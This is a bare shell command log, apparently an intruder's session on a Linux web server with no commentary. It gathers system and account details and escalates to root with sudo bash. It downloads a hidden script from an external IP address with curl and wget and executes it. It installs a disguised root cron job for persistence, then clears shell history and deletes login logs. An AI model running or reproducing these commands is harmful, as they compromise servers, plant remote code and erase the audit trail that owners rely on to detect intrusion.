id
uname -a
whoami
cat /etc/os-release
cat /etc/passwd
ls -la /var/www
sudo -l
sudo bash
cd /tmp
curl -s -o .update.sh http://45.146.164.110/x/update.sh
wget -q http://45.146.164.110/x/update.sh -O /tmp/.update.sh
chmod +x /tmp/.update.sh
cat .update.sh | head -n 20
./.update.sh
ps aux | grep -i update
echo '*/5 * * * * root /tmp/.update.sh' > /etc/cron.d/apt-refresh
cat /etc/cron.d/apt-refresh
systemctl restart cron
history -c
rm -f /var/log/wtmp.1
exit
